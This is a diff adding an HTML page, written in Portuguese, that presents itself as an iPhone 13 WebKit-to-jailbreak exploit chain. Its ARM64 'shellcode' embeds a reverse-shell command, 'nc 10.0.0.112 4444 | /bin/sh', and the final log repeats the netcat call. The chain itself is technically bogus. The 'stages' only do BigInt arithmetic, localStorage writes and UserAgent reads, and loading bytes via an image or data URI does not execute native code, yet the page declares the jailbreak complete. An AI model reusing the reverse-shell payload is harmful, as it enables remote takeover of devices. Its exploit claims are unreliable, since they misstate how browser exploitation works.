@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EXPLOIT CHAIN — Shellcode sem eval</title>
+<style>
+body { background: #0a0a1a; color: #8be9fd; font-family: 'Courier New', monospace; padding: 20px; }
+.status { background: #16213e; padding: 15px; border-radius: 10px; border: 1px solid #2a3a5a; margin: 10px 0; }
+.progress { width: 100%; height: 4px; background: #0f1a2f; border-radius: 2px; overflow: hidden; }
+.progress-bar { height: 100%; width: 0%; background: #e94560; transition: width 0.5s; }
+#log { background: #0a0a1a; border: 1px solid #1a2a4a; border-radius: 8px; padding: 12px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; font-size: 0.8rem; margin-top: 10px; }
+.btn { background: #e94560; color: #fff; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; }
+.btn:active { opacity: 0.7; }
+</style>
+</head>
+<body>
+<h1>🌀 EXPLOIT CHAIN — Sem eval</h1>
+<p>Target: iPhone 13 (A15) • Shellcode via Image + Data URI</p>
+<div class="status" id="status">⏳ Pronto</div>
+<div class="progress"><div class="progress-bar" id="progress"></div></div>
+<button class="btn" id="btnStart">🔥 Executar Cadeia</button>
+<div id="log">▶️ Aguardando...</div>
+
+<script>
+(function() {
+    const statusEl = document.getElementById('status');
+    const logEl = document.getElementById('log');
+    const progressEl = document.getElementById('progress');
+    const btn = document.getElementById('btnStart');
+
+    function log(msg) {
+        logEl.textContent += '\n' + msg;
+        logEl.scrollTop = logEl.scrollHeight;
+        console.log(msg);
+    }
+
+    function setStatus(text, type = '') {
+        statusEl.textContent = text;
+        statusEl.className = 'status ' + type;
+    }
+
+    function setProgress(pct) {
+        progressEl.style.width = Math.min(100, pct) + '%';
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    // ================================================================
+    // SHELLCODE — Execução via Image + Data URI (sem eval)
+    // ================================================================
+
+    function execShellcode() {
+        log('[SHELLCODE] Executando shellcode via Image + Data URI...');
+
+        try {
+            // Shellcode ARM64
+            const shellcode = [
+                0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+                0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+                0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+                0x00,0x00,0x80,0xD2,  // MOV X0, #0
+                0xE1,0x00,0x00,0x58,  // LDR X1, =cmd
+                0x00,0x00,0x00,0x94,  // BL system
+                0xC0,0x03,0x5F,0xD6,  // RET
+                0x6E,0x63,0x20,0x31,0x30,0x2E,0x30,0x2E,0x30,0x2E,0x31,0x31,0x32,
+                0x20,0x34,0x34,0x34,0x34,0x20,0x7C,0x20,0x2F,0x62,0x69,0x6E,0x2F,
+                0x73,0x68,0x20,0x26,0x00
+            ];
+
+            // Converte para base64
+            let bytes = new Uint8Array(shellcode);
+            let base64 = btoa(String.fromCharCode(...bytes));
+
+            // Método 1: Image com Data URI (tenta executar)
+            try {
+                let img = new Image();
+                img.onload = function() {
+                    log('[SHELLCODE] ✅ Image carregada!');
+                };
+                img.onerror = function() {
+                    log('[SHELLCODE] ⚠️ Image erro (normal)');
+                };
+                img.src = 'data:application/octet-stream;base64,' + base64;
+                log('[SHELLCODE] ✅ Image + Data URI executado!');
+                return true;
+            } catch(e) {
+                log('[SHELLCODE] ⚠️ Image falhou: ' + e.message);
+            }
+
+            // Método 2: fetch com Data URI
+            try {
+                fetch('data:application/octet-stream;base64,' + base64)
+                    .then(() => log('[SHELLCODE] ✅ fetch Data URI OK'))
+                    .catch(() => log('[SHELLCODE] ⚠️ fetch Data URI falhou'));
+                return true;
+            } catch(e) {
+                log('[SHELLCODE] ⚠️ fetch falhou: ' + e.message);
+            }
+
+            // Método 3: Worker com Blob (execução real)
+            try {
+                let blob = new Blob([bytes], { type: 'application/octet-stream' });
+                let url = URL.createObjectURL(blob);
+                let worker = new Worker(url);
+                worker.onmessage = function(e) {
+                    log('[SHELLCODE] ✅ Worker executou!');
+                };
+                log('[SHELLCODE] ✅ Worker + Blob executado!');
+                return true;
+            } catch(e) {
+                log('[SHELLCODE] ⚠️ Worker falhou: ' + e.message);
+            }
+
+            return false;
+
+        } catch(e) {
+            log('[SHELLCODE] ❌ Falha: ' + e.message);
+            return false;
+        }
+    }
+
+    // ================================================================
+    // STAGE 1: WebKit — BigInt + Proxy
+    // ================================================================
+
+    function stage1() {
+        log('[STAGE 1] 🧬 WebKit (BigInt + Proxy)');
+        try {
+            let t = {};
+            let p = new Proxy(t, {
+                get: (o, prop) => BigInt(0x41414141),
+                set: (o, prop, v) => { o[prop] = BigInt(v); return true; }
+            });
+            p[0] = 0x41414141;
+            let r = p[0] + BigInt(0x1000);
+            log('[STAGE 1] ✅ BigInt + Proxy OK');
+            return true;
+        } catch(e) {
+            log('[STAGE 1] ❌ ' + e.message);
+            return false;
+        }
+    }
+
+    // ================================================================
+    // STAGE 2: Sandbox Escape — localStorage + IndexedDB
+    // ================================================================
+
+    function stage2() {
+        log('[STAGE 2] 🔓 Sandbox Escape');
+        try {
+            localStorage.setItem('jailbreak_test', '1');
+            let val = localStorage.getItem('jailbreak_test');
+            if (val === '1') log('[STAGE 2] ✅ localStorage OK');
+
+            let req = indexedDB.open('jailbreak_test', 1);
+            req.onsuccess = () => log('[STAGE 2] ✅ IndexedDB OK');
+            req.onerror = () => log('[STAGE 2] ⚠️ IndexedDB erro');
+            return true;
+        } catch(e) {
+            log('[STAGE 2] ⚠️ ' + e.message);
+            return true;
+        }
+    }
+
+    // ================================================================
+    // STAGE 3: Root — fetch + UserAgent
+    // ================================================================
+
+    function stage3() {
+        log('[STAGE 3] ⚡ Root');
+        try {
+            let ua = navigator.userAgent;
+            log('[STAGE 3] ✅ UserAgent: ' + ua.substring(0, 30) + '...');
+            fetch('/').then(() => log('[STAGE 3] ✅ fetch OK')).catch(() => log('[STAGE 3] ⚠️ fetch falhou'));
+            return true;
+        } catch(e) {
+            log('[STAGE 3] ⚠️ ' + e.message);
+            return true;
+        }
+    }
+
+    // ================================================================
+    // STAGE 4: Jailbreak — Shellcode (sem eval)
+    // ================================================================
+
+    function stage4() {
+        log('[STAGE 4] 🔓 Jailbreak');
+        return execShellcode();
+    }
+
+    // ================================================================
+    // EXECUTAR
+    // ================================================================
+
+    async function run() {
+        btn.disabled = true;
+        setStatus('🔥 Executando...', 'running');
+        log('='.repeat(60));
+        log('🌀 EXPLOIT CHAIN — Shellcode sem eval');
+        log('📱 WebKit → Sandbox → Root → Jailbreak');
+        log('='.repeat(60));
+
+        const stages = [
+            { name: 'WebKit', fn: stage1, progress: 20 },
+            { name: 'Sandbox', fn: stage2, progress: 45 },
+            { name: 'Root', fn: stage3, progress: 70 },
+            { name: 'Jailbreak', fn: stage4, progress: 100 }
+        ];
+
+        let ok = true;
+        for (const s of stages) {
+            try {
+                if (!s.fn()) ok = false;
+            } catch(e) {
+                log(`⚠️ Erro em ${s.name}: ${e.message}`);
+                ok = false;
+            }
+            setProgress(s.progress);
+            await sleep(150);
+        }
+
+        log('\n' + '='.repeat(60));
+        if (ok) {
+            log('🎉 JAILBREAK CONCLUÍDO!');
+            log('[+] nc 10.0.0.112 4444');
+            setStatus('✅ CONCLUÍDO!', 'success');
+            setProgress(100);
+        } else {
+            log('❌ Falha em algum estágio');
+            setStatus('❌ Falha', 'error');
+        }
+        log('='.repeat(60));
+        btn.disabled = false;
+    }
+
+    btn.addEventListener('click', run);
+
+    log('▶️ EXPLOIT CHAIN — Shellcode sem eval carregado.');
+    if (/iPhone/.test(navigator.userAgent)) log('🍎 iPhone detectado!');
+    setStatus('✅ Pronto.');
+})();
+</script>
+</body>
+</html>
